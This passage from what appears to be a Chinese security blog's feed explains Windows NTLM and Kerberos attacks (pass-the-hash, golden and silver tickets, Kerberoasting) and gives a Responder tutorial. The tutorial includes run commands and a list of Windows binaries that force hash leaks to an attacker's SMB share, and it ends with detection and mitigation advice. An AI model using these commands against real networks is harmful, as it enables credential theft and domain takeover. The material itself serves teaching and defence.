PTH"></a>NTLM-Relay &amp; PTH</h4><p>NTLM-Relay 和 <strong>Pass the Hash（PTH）</strong>在某些部分有些相似，但实际上是完全不同的两个东西。NTLM-Relay 针对的是用于网络认证的 Net-NTLM Hash，而 LMHash 或者 NTHash 从严格意义上讲，可以用来进行 pass the hash attack，但并不能进行 relay attack。</p><blockquote><p>通常我们使用 Responder 等工具获取到的就是 Net-NTLM Hash，这类 hash 并不能直接用来 PTH，但可以通过暴力破解来获取明文密码。</p></blockquote><p>Pass the Hash 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过传递 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。如果内网主机的本地管理员账户密码相同，即可通过 Pass the Hash 远程登录到任意一台主机。</p><p>利用 Pass the Hash 的渗透方式如下：</p><ol><li>获取某一台域主机管理员权限；</li><li>Dump（抓取）内存获取用户 hash；</li><li>通过 Pass the Hash 尝试登录其他主机；</li><li>继续搜集 hash 并尝试远程登录；</li><li>直到获得域管理员账户 hash，登录域控，最终成功控制整个域。</li></ol><p>这类攻击适用于：</p><ul><li>域/工作组环境</li><li>可以获得 hash，但条件不允许对 hash 进行爆破</li><li>内网中存在和当前机器相同的密码</li></ul><h4 id="PTK"><a href="#PTK" class="headerlink" title="PTK"></a>PTK</h4><p>随着大家对 Pass the Hash 的认识越来越高，防御方法也越来越多，微软在2014年发布了更新补丁 kb2871997 禁止本地管理员账户用于远程连接，这样就无法以本地管理员用户的权限执行 WMI、psexec、schtasks、at 和访问文件共享。同样，禁用 NTLM 也使得 psexec 无法利用获得的 NTLM Hash 进行远程连接。</p><blockquote><p>然而，安全研究人员在测试中发现，打了补丁之后，常规的 Pass The Hash 已经无法成功，唯独默认的 Administrator（SID 500）账号例外，利用这个账号仍可以进行 Pass The Hash 远程连接（2014）。</p><p>所以对于防御方来说，即使打了补丁也要记得禁用 SID=500 的管理员账户。</p></blockquote><p>由于 <strong>mimikatz</strong> 的出现， 再次改变了格局。国外安全研究人员开发的 mimikatz 实现了在禁用 NTLM 的环境下仍然可以远程连接，并且可以通过用户账户的 aes Key 进行远程连接，即利用 <strong>Pass the Key（PTK）</strong>。</p><h3 id="0x04-Kerberos-身份认证"><a href="#0x04-Kerberos-身份认证" class="headerlink" title="0x04 Kerberos 身份认证"></a>0x04 Kerberos 身份认证</h3><p>Kerberos 一词来源于希腊神话，是一种基于<strong>票据（Ticket）</strong>的认证方式，其中三个主体分别是客户端、服务器和第三方认证服务器 KDC。客户端用户在访问服务器前，需要先从第三方认证服务器 KDC 处获取许可证，只有通过合法性认证的用户，才能依据票据去访问所需的服务和应用。</p><blockquote><p>在 Windows 域环境中，KDC 的角色由 DC（Domain Controller）来担当。</p></blockquote><h4 id="Kerberos-认证过程"><a href="#Kerberos-认证过程" class="headerlink" title="Kerberos 认证过程"></a>Kerberos 认证过程</h4><p>一次完整的 Kerberos 身份认证流程，如图所示：</p><p><img src="/img/Windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6/kerberos.png" alt="img"></p><p>1）账号 A 和 KDC 互相认证</p><p>账号 A 利用 hash 函数把密码转化成一把密钥，我们称它为 Kclt，用 Kclt 加密当前时间戳，生成一个字符串 {时间戳}Kclt。把上一步生成的字符串 {时间戳}Kclt、账号 A 的信息，以及一段随机字符串发给 KDC。这样就组成了 Kerberos 的身份认证请求 <strong>AS_REQ</strong>。</p><p>KDC 收到 AS_REQ 之后，先读到账号 A 的信息，于是便调出 A 的密码，再用同样的 hash 函数转化为 <strong>Kclt</strong>。有了 Kclt 就可以解开{时间戳}Kclt，如果能成功解开，则说明该请求是由账号 A 生成的，即完成对账号 A 的身份认证。</p><p>接下来轮到 KDC 向账号 A 证明自己的身份，KDC 使用 Kclt 加密随机字符串，回复给账号 A，如果账户 A 拿到回复后能够解出随机字符串，则说明 KDC 为真。</p><p>同时，KDC 生成两把一样的密钥 <strong>Kclt-Kdc</strong>，用于以后账户 A 和 KDC 之间互相认证，这样就省去了每次都要调出账号 A 的密码和 hash 等工作。其中一把密钥发给账户 A 保管，另一把由 KDC 把自己的密码 hash 成 <strong>KKdc</strong>，然后用它加密另一把委托给 A 的密钥，把这个委托的密钥称为 <strong>TGT（Ticket Granting Ticket）</strong>，TGT = {账户 A 的信息, Kclt-kdc}，返回 <strong>AS_REP</strong> = TGT, {Kclt-kdc, 时间戳, 随机字符串}Kclt。</p><p>账号 A 收到 AS_REP 后利用 Kclt 解密信息，通过解开随机字符串和时间戳来确定 KDC 的真实性，然后把 Kclt-kdc 和 TGT 保存起来备用。</p><p>2）账号 A 请求 KDC 认证资源 B</p><p>首先 A 将 TGT 交还给 KDC，其次还有账号 A 的相关信息，当前时间戳，以及要访问的资源 B 的信息，生成 <strong>TGS-REQ</strong>。</p><p>KDC 收到 TGS-REQ 后，先用 Kkdc 解密 TGT 得到 Kclt-kdc，再用 Kclt-kdc 解密出账号 A 的相关信息和时间戳来验证其身份。一旦确认账号A为真，就可以帮助 A 和 B 完成互相认证了。</p><p>KDC 生成两把同样的密钥 <strong>Kclt-srv</strong> 供 A 和 B 之间使用，其中一把密钥直接交给 A，另一把委托 A 交给 B。为了确保 A 不会受到假的资源 B 欺骗，Kerberos 把 B 的密码 hash 成 <strong>Ksrv</strong>，然后用它加密那把委托 A 交给 B 的 Kclt-srv ，成为一张只有真正的 B 能解开的 <strong>Ticket</strong>，Ticket = {账户 A 的信息, Kclt-srv}Ksrv，返回 <strong>TGS-REP</strong> = {Kclt-srv}Kclt-kdc, Ticket。</p><p>账号 A 收到 TGS-REP 后，先用 Kclt-kdc 解开 {Kclt-srv}Kclt-kdc，得到 Kclt-srv，再将 Ticket 保留着发给资源B。接下来如果需要多次访问资源 B，<strong>都可以使用同一个 Ticket，而不需要每次都向 KDC 申请</strong>。</p><p>3）账号 A 和资源 B 互相认证</p><p>账号 A 给资源 B 发送 <strong>CS-REQ</strong> = {账号A的信息，时间戳}Kclt-srv, Ticket。如果资源 B 为真，则可以使用自己的 Ksrv 解开 Ticket，得到 Kclt-srv，从而可以解开 {账号A的信息，时间戳}Kclt-srv，这样资源 B 就可以确定账户 A 为真，然后回复 <strong>CS-REP</strong> = {时间戳}Kclt-srv，来证明自己也是真的。账号 A 解密 CS-REP，再通过时间戳来判断对方是否为真。</p><p>更详细的过程可参考《Wireshark网络分析就这么简单》中 Kerberos 的相关章节，作者的解释十分通俗易懂。</p><h4 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h4><p><strong>Pass the Ticket（PTT）</strong>是利用 Kerberos 协议进行的 Ticket 传递攻击，有三种常见的利用方法：MS14-068，Golden Ticket 和 Silver Ticket。</p><p><strong>MS14-068</strong></p><p>MS14-068 是 Windows 密钥分发中心（KDC）服务中的一个严重漏洞，其影响全部版本 Windows 版本的服务器，该漏洞允许攻击者提升任意普通域用户成为域管理员账户，攻击者可以利用这些提升的权限控制域中所有的计算机，包括域服务器。</p><p>漏洞的主要成因是由于 KDC 允许经过身份验证的用户在其 Kerberos 票证（TGT）中插入任意 PAC，当用户进行登录身份验证时，KDC 会验证 PAC 中的签名，并使用 PAC 中的数据为用户创建一个登录令牌，而 KDC 服务器端的 PAC signature 时没有严格控制使用 checksum 算法，导致客户端可以提交伪造的 PAC 欺骗 KDC 获取任意票证。</p><p>关于 MS14-068 漏洞的详细分析可以看这篇文章：<a href="https://www.freebuf.com/vuls/56081.html">深入解读 MS14-068 漏洞：微软精心策划的后门？</a></p><p><strong>黄金票据（Golden Ticket）</strong></p><p>该票据的利用条件是原先已成功取得 KDC（<strong>krbtgt</strong> 用户）的密码 hash（即 KKdc），并且还有一个普通域用户权限，在此条件下，我们可以利用 krbtgt 的 hash 值伪造生成任意用户的 TGT，绕过账号策略，让用户成为任意组的成员，还能利用该票据重新获得域管理员权限。</p><blockquote><p>因为 krbtgt 只有域控制器上才有，使用黄金凭据意味着你之前拿到过域控制器的权限，所以可以理解为是一个后门。</p></blockquote><p><strong>白银票据（Silver Ticket）</strong></p><p>通过分析 Kerberos 协议的认证过程不难发现，如果我们获取了 Server B 的秘钥 Ksrv，就可以跳过 KDC 的认证，直接伪造票据与 Server 通信。</p><p>Silver Ticket 和 Golden Ticket 不同的是，它不需要和域控制器进行通信，原理是伪造 TGS 服务器，使用计算机账户的 hash 进行加密，所以只能对单一的服务进行授权，访问指定的权限。而 Golden Ticket 的利用过程需要访问域控，原理是伪造 TGT，由 Kerberos 的 hash 进行加密，可以获取任何 Kerberos 服务权限。</p><h4 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h4><p>2014年 SANS HackFest 大会上 Tim Medin 提出了一种新的攻击 Kerberos 的技术，他称之为 “Kerberoasting”。Tim 给出的利用方法是使用工具集的组合来请求票证，并从内存中提取票证，然后将它们转换为可破解的格式。更详细的技术细节，可以见 Tim 的 PPT 或 <a href="https://adsecurity.org/?p=2293">Cracking Kerberos TGS Tickets Using Kerberoast</a>。</p><h3 id="0x05-相关利用工具"><a href="#0x05-相关利用工具" class="headerlink" title="0x05 相关利用工具"></a>0x05 相关利用工具</h3><h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a><br>PTH、PTK、PTT 攻击，提取 Windows 明文密码、hash 值等凭据。</p><h4 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h4><p><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a><br>PowerSploit 框架和 Empire 的一部分，用于内网信息搜集。</p><h4 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h4><p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash">https://github.com/Kevin-Robertson/Invoke-TheHash</a><br>Windows WMIC 的强化版，可用于 PTH 攻击。</p><h4 id="Kerberoast"><a href="#Kerberoast" class="headerlink" title="Kerberoast"></a>Kerberoast</h4><p><a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a><br>Kerberoasting 利用工具包。</p><h4 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h4><p><a href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a><br>劫持 LLMNR 和 NBT-NS 请求，获取 Net-NTLM Hash。</p><p><strong>参考文章：</strong><br><a href="https://2018.zeronights.ru/wp-content/uploads/materials/08-Ntlm-Relay-Reloaded-Attack-methods-you-do-not-know.pdf">腾讯安全玄武实验室 NTLM Relay Reloaded Attack methods you do not know.pdf</a><br><a href="https://xz.aliyun.com/t/2445">https://xz.aliyun.com/t/2445</a><br><a href="http://www.tiejiang.org/23508.html">http://www.tiejiang.org/23508.html</a><br><a href="http://xnianq.cn/2018/10/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">http://xnianq.cn/2018/10/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</a><br><a href="https://www.cnblogs.com/bmjoker/p/10355979.html#autoid-0-0-0">https://www.cnblogs.com/bmjoker/p/10355979.html#autoid-0-0-0</a><br><a href="https://www.4hou.com/technology/16263.html">https://www.4hou.com/technology/16263.html</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/">https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>内网渗透</category>
      
      <category>身份认证</category>
      
    </categories>
    
    
    <tags>
      
      <tag>concept</tag>
      
      <tag>Web</tag>
      
      <tag>OWASP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Responder 内网渗透神器</title>
    <link href="/post/Responder%20%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/"/>
    <url>/post/Responder%20%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p>Responder 工具是一款强大并且简单易用的内网渗透神器，可以劫持 LLMNR 和 NBT-NS 请求。</p><p>工作原理是，在域名解析过程中，如果客户端/目标无法通过 DNS 进行域名解析，则会回退到 LLMNR 和 NBT-NS 协议下进行解析，在 Responder 运行的情况下，会对所有能收到的 LLMNR 和 NBT-NS 请求进行欺骗性响应，然后将所有的数据流导向到攻击者的机器。</p><p><strong>下载地址：</strong></p><ol><li><a href="https://github.com/SpiderLabs/Responder">LLMNR/NBT-NS/mDNS Poisoner</a></li><li><a href="https://github.com/lgandx/Responder">LLMNR/NBT-NS/mDNS Poisoner and NTLMv1/2 Relay</a></li></ol><h2 id="0x01-功能特性"><a href="#0x01-功能特性" class="headerlink" title="0x01 功能特性"></a>0x01 功能特性</h2><ul><li><p>内置 SMB 认证服务器</p><p>默认支持带 NTLMSSP 安全扩展的 NTLMv1, NTLMv2 散列，已在 Windows 95 到 Windows Server 2012 RC, Samba 和 Mac OSX Lion 上成功测试。Windows NT4 支持明文密码，对于 Windows XP/2003 以及更早的版本，当设置 <code>--lm</code> 选项时，启用强制 LM 哈希降级。当工具启动时默认开启此功能，可以截获 Hash 进行 SMB 重放攻击（SMB Relay）。</p></li><li><p>内置 MSSQL 认证服务器</p><p>对 Windows 版本高于 Windows Vista 的机器使用 <code>-r</code> 选项，以将 MSSQL 身份验证重定向到此工具（对于 Vista 和更高版本，Windows 将使用 LLMNR 协议）。该服务器支持 NTLMv1、LMv2 散列，已在 Windows SQL Server 2005 和 2008 上成功测试。</p></li><li><p>内置 HTTP 认证服务器</p><p>对 Windows 版本高于 Windows Vista 的机器使用 <code>-r</code> 选项，以将 HTTP 身份验证重定向到此工具。该服务器支持 NTLMv1、NTLMv2 散列和基本身份验证，已在 IE 6 到 IE 10, Firefox, Chrome, Safari 上成功测试。</p><blockquote><p>注：此模块也适用于拦截 Windows WebDav 客户端（WebClient）发出的 WebDav NTLM 认证，可以向受害者发送任意文件。</p></blockquote></li><li><p>内置 HTTPS 认证服务器</p><p>对 Windows 版本高于 Windows Vista 的机器使用 <code>-r</code> 选项，以将 HTTPS 身份验证重定向到此工具。</p><blockquote><p><code>certs/</code> 目录下有两个默认的证书文件，目的是使 Responder 可以更容易使用，你也可以根据需要使用脚本生成自签名密钥对。</p></blockquote></li><li><p>内置 LDAP 认证服务器</p><p>对 Windows 版本高于 Windows Vista 的机器使用 <code>-r</code> 选项，以将 LDAP 身份验证重定向到此工具。该服务器已在 Windows支持工具 ldp 和 LdapAdmin 上成功测试。</p></li><li><p>内置 FTP, POP3, IMAP, SMTP 认证服务器</p><p>用于收集明文凭证。</p></li><li><p>内置 DNS 服务器</p><p>用于响应 A 类型的查询请求，结合 ARP 欺骗攻击将非常强大。</p></li><li><p>内置 WPAD 代理服务器</p><p><strong>这个模块非常有效</strong>，此模块将捕获网络中其他用户所有的 HTTP 请求。您可以在 <code>Responder.conf</code> 中配置自定义的 PAC 脚本文件，并将 HTML 代码注入服务器的响应中，具体细节可以看 <code>Responder.conf</code>。</p><p>该模块会抓取网络中的数据包,然后找到开启了Auto-detect settings的ie浏览器,然后向他注入PAC脚本具体可以看Responder.conf.</p><blockquote><p>注：需要用户在 IE 中启用了“自动检测设置”（Auto-detect settings）。</p></blockquote></li><li><p>Browser Listener</p><p>浏览器监听模块，该模块允许在隐身模式下找到 PDC。</p><blockquote><p>PDC：Primary Domain Controller（Microsoft Windows NT Server），主域控制器</p></blockquote></li><li><p>Fingerprinting</p><p>指纹识别模式，当使用 <code>-f</code> 选项时，Responder 会自动识别使用 LLMNR/NBT-NS 查询的主机指纹，所有捕获模块在指纹识别模式下仍然可以工作。</p></li><li><p>Icmp Redirect</p><p>ICMP 重定向攻击（ICMP Redirects）模块，适用于 Windows XP/2003 和更早版本的域成员间进行 MITM 中间人攻击，结合 DNS 服务器模块使用会相当有效。</p><blockquote><p>使用 python tools/Icmp-Redirect.py</p></blockquote></li><li><p>Rogue DHCP</p><p>DHCP 欺骗攻击（DHCP Inform Spoofing）模块，允许你让真正的 DHCP 服务器响应 DHCPINFORM 请求，从而设置你的 IP 地址为主 DNS 服务器，并设置你自己的 WPAD 代理服务器。</p><blockquote><p>使用 python tools/DHCP.py</p></blockquote></li><li><p>Analyze mode</p><p>分析模式，在模式下允许你查看网络上的 NBT-NS、BROWSER、LLMNR、DNS 请求，而不会进行任何攻击行为。此外，您还可以被动地映射域、MSSQL 服务器和工作站的网络拓扑，并查看 ICMP 重定向攻击在子网上是否可行。</p></li></ul><h2 id="0x02-选项参数"><a href="#0x02-选项参数" class="headerlink" title="0x02 选项参数"></a>0x02 选项参数</h2><blockquote><p>在使用前请查看 <code>Response .conf</code> 并根据您的需要进行调整。</p></blockquote><p>使用样例：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs reasonml">./<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Responder</span>.</span></span>py -I eth0 -wrf<br></code></pre></td></tr></table></figure><p>选项：</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs vhdl"><span class="hljs-comment">--version             show program&#x27;s version number and exit</span><br>-h, <span class="hljs-comment">--help            show this help message and exit</span><br>-A, <span class="hljs-comment">--analyze         Analyze mode. This option allows you to see NBT-NS,</span><br>                      BROWSER, LLMNR requests without responding.<br>-I eth0, <span class="hljs-comment">--interface=eth0</span><br>                      Network interface <span class="hljs-keyword">to</span> <span class="hljs-keyword">use</span>, you can <span class="hljs-keyword">use</span> <span class="hljs-symbol">&#x27;ALL</span>&#x27; as a<br>                      wildcard <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> interfaces<br>-i <span class="hljs-number">10.0</span>.<span class="hljs-number">0.21</span>, <span class="hljs-comment">--ip=10.0.0.21</span><br>                      Local IP <span class="hljs-keyword">to</span> <span class="hljs-keyword">use</span> (only <span class="hljs-keyword">for</span> OSX)<br>-e <span class="hljs-number">10.0</span>.<span class="hljs-number">0.22</span>, <span class="hljs-comment">--externalip=10.0.0.22</span><br>                      Poison <span class="hljs-keyword">all</span> requests <span class="hljs-keyword">with</span> another IP address than<br>                      Responder<span class="hljs-symbol">&#x27;s</span> one.<br>-b, <span class="hljs-comment">--basic           Return a Basic HTTP authentication. Default: NTLM</span><br>-r, <span class="hljs-comment">--wredir          Enable answers for netbios wredir suffix queries.</span><br>                      Answering <span class="hljs-keyword">to</span> wredir will likely break stuff <span class="hljs-keyword">on</span> the<br>                      network. <span class="hljs-keyword">Default</span>: <span class="hljs-literal">False</span><br>-d, <span class="hljs-comment">--NBTNSdomain     Enable answers for netbios domain suffix queries.</span><br>                      Answering <span class="hljs-keyword">to</span> domain suffixes will likely break stuff<br>                      <span class="hljs-keyword">on</span> the network. <span class="hljs-keyword">Default</span>: <span class="hljs-literal">False</span><br>-f, <span class="hljs-comment">--fingerprint     This option allows you to fingerprint a host that</span><br>                      issued an NBT-NS <span class="hljs-keyword">or</span> LLMNR query.<br>-w, <span class="hljs-comment">--wpad            Start the WPAD rogue proxy server. Default value is</span><br>                      <span class="hljs-literal">False</span><br>-u UPSTREAM_PROXY, <span class="hljs-comment">--upstream-proxy=UPSTREAM_PROXY</span><br>                      Upstream HTTP proxy used by the rogue WPAD Proxy <span class="hljs-keyword">for</span><br>                      outgoing requests (format: host:<span class="hljs-keyword">port</span>)<br>-F, <span class="hljs-comment">--ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file</span><br>                      retrieval. This may cause a login prompt. <span class="hljs-keyword">Default</span>:<br>                      <span class="hljs-literal">False</span><br>-P, <span class="hljs-comment">--ProxyAuth       Force NTLM (transparently)/Basic (prompt)</span><br>                      authentication <span class="hljs-keyword">for</span> the proxy. WPAD doesn<span class="hljs-symbol">&#x27;t</span> need <span class="hljs-keyword">to</span> be<br>                      <span class="hljs-keyword">ON</span>. This option <span class="hljs-keyword">is</span> highly effective <span class="hljs-keyword">when</span> combined <span class="hljs-keyword">with</span><br>                      -r. <span class="hljs-keyword">Default</span>: <span class="hljs-literal">False</span><br><span class="hljs-comment">--lm                  Force LM hashing downgrade for Windows XP/2003 and</span><br>                      earlier. <span class="hljs-keyword">Default</span>: <span class="hljs-literal">False</span><br>-v, <span class="hljs-comment">--verbose         Increase verbosity.</span><br></code></pre></td></tr></table></figure><h2 id="0x03-使用示例"><a href="#0x03-使用示例" class="headerlink" title="0x03 使用示例"></a>0x03 使用示例</h2><ul><li><p><strong>针对特定主机</strong></p><p>如果你想针对特定的 IP / IP范围，可以通过修改 <code>Responder.conf</code> 并更改 <strong>RespondTo</strong> 参数。当你只是想针对特定的目标时，这是非常有用的，因为你不希望导致整个网络的中断。此外，还可以通过改变 RespondToName 参数来指定 NBT-NS/LLMNR 名称。下图中，我们就是针对主机 192.168.253.130 进行的特定攻击。</p><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/1562575008600.png" alt="修改 Responder.conf 文件更改 RespondTo 参数 "></p></li><li><p><strong>分析模式</strong></p><blockquote><p>使用 ./Responder.py -I eth0 -A 命令启用分析模式</p></blockquote><p>在 <code>-A</code> 分析模式下时，Responder 会被动监听网络中的事件，但不主动响应任何请求，如图所示：</p><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/1562576050781.png" alt="启动 Responder 分析模式 "></p></li><li><p><strong>WPAD 攻击</strong></p><blockquote><p>使用 <strong>./Responder.py -I eth0 wrf</strong> 命令启动 WPAD 攻击</p></blockquote><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/1562659253546.png" alt="启动 Responder WPAD 攻击模式 "></p><p>对于 SMB 协议，客户端在连接服务端时，默认先使用本机的用户名和密码 Hash 尝试登录，因此可以模拟 SMB 服务器从而截获 Hash，执行如下命令都可以在攻击机得到 Hash：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs shell">net.exe use \\host\share<br>attrib.exe \\host\share<br>bcdboot.exe \\host\share<br>bdeunlock.exe \\host\share<br>cacls.exe \\host\share<br>certreq.exe \\host\share #(noisy, pops an error dialog)<br>certutil.exe \\host\share<br>cipher.exe \\host\share<br>ClipUp.exe -l \\host\share<br>cmdl32.exe \\host\share<br>cmstp.exe /s \\host\share<br>colorcpl.exe \\host\share #(noisy, pops an error dialog)<br>comp.exe /N=0 \\host\share \\host\share<br>compact.exe \\host\share<br>control.exe \\host\share<br>convertvhd.exe -source \\host\share -destination \\host\share<br>Defrag.exe \\host\share<br>DeployUtil.exe /install \\host\share<br>DevToolsLauncher.exe GetFileListing \\host\share #(this one&#x27;s cool. will return a file listing (json-formatted) from remote SMB share...)<br>diskperf.exe \\host\share<br>dispdiag.exe -out \\host\share<br>doskey.exe /MACROFILE=\\host\share<br>esentutl.exe /k \\host\share<br>expand.exe \\host\share<br>extrac32.exe \\host\share<br>FileHistory.exe \\host\share #(noisy, pops a gui)<br>findstr.exe * \\host\share<br>fontview.exe \\host\share #(noisy, pops an error dialog)<br>fvenotify.exe \\host\share #(noisy, pops an access denied error)<br>FXSCOVER.exe \\host\share #(noisy, pops GUI)<br>hwrcomp.exe -check \\host\share<br>hwrreg.exe \\host\share<br>icacls.exe \\host\share<br>LaunchWinApp.exe \\host\share #(noisy, will pop an explorer window with the  contents of your SMB share.)<br>licensingdiag.exe -cab \\host\share<br>lodctr.exe \\host\share<br>lpksetup.exe /p \\host\share /s<br>makecab.exe \\host\share<br>MdmDiagnosticsTool.exe -out \\host\share #(sends hash, and as a *bonus!* writes an MDMDiagReport.html to the attacker share with full CSP configuration.)<br>mshta.exe \\host\share #(noisy, pops an HTA window)<br>msiexec.exe /update \\host\share /quiet<br>msinfo32.exe \\host\share #(noisy, pops a &quot;cannot open&quot; dialog)<br>mspaint.exe \\host\share #(noisy, invalid path to png error)<br>mspaint.exe \\host\share\share.png #(will capture hash, and display the remote PNG file to the user)<br>msra.exe /openfile \\host\share #(noisy, error)<br>mstsc.exe \\host\share #(noisy, error)<br>netcfg.exe -l \\host\share -c p -i foo<br></code></pre></td></tr></table></figure><p><strong>攻击流量情况：</strong></p></li></ul><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/Kali-Linux-2019-07-09-16-02-02.png" alt="向受害者发送 NBNS 欺骗响应"></p><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/Kali-Linux-2019-07-09-16-12-06.png" alt="向受害者发送 LLMNR 欺骗响应"></p><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/Kali-Linux-2019-07-09-16-10-38.png" alt="重定向身份认证过程中 SMB 传输的用户名和 HASH 值 "></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><h3 id="特征流量检测"><a href="#特征流量检测" class="headerlink" title="特征流量检测"></a>特征流量检测</h3><ul><li><p>特征行为检测</p><p>程序在启动时会连续发送两个完全相同的 IGMPv3 数据包，请求同时加入 224.0.0.251 和 224.0.0.252 组播组，同样程序在退出时，也会发送两个相同的 IGMPv3 数据包，请求离开上述的组播组，如下图所示：</p><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/Kali-Linux-2019-07-09-16-16-34.png" alt="Responder 工具 WPAD 攻击启动时行为"></p><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/Kali-Linux-2019-07-09-16-16-49.png" alt="Responder 工具 WPAD 攻击退出时行为 "></p></li><li><p>特殊协议捕获</p><p>对整个过程中使用的特殊协议进行捕获（主要为 SMB、LLMNR、NBNS、MDNS、IGMPv3、BROWSER），如果多个上述协议中的数据流量同时指向一个主机，则怀疑有可能受到攻击。</p></li><li><p>特征端口检测</p><p>该工具监听以下端口：UDP 137, UDP 138, UDP 53, UDP/TCP 389, TCP 1433, TCP 80, TCP 139, TCP 445, TCP 21, TCP 3141, TCP 25, TCP 110, TCP 587 和 多播 UDP 5553。</p><p>对这些特殊端口的流量要格外注意，并加强分析。</p></li><li><p>敏感内容检测</p><p>重点关注 SMB 数据包中所返回的明文内容，其包含用户在 NTML 验证过程中所使用的 Username、hash 值等，对敏感字符做特征匹配。</p></li></ul><h3 id="预防和修复"><a href="#预防和修复" class="headerlink" title="预防和修复"></a>预防和修复</h3><p>为了加强 Windows 系统的安全性，可以进行以下调整。</p><ul><li><p>通过组策略禁用 LLMNR</p><p>打开 gpedit.msc 到计算机配置 &gt; 管理 &gt; 网络 &gt; DNS 客户端 &gt; 关闭多播域名解析，并设置为已启用：</p><p><img src="/img/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/1562835661260.png" alt="关闭多播域名解析"></p></li><li><p>禁用 NetBIOS</p><p>这可以到以太网 &gt; 属性 &gt; IPv4 &gt; 属性 &gt; 高级 &gt; WINS，然后在“NetBIOS设置”下选择禁用 TCP/IP 上的 NetBIOS：</p><p><img 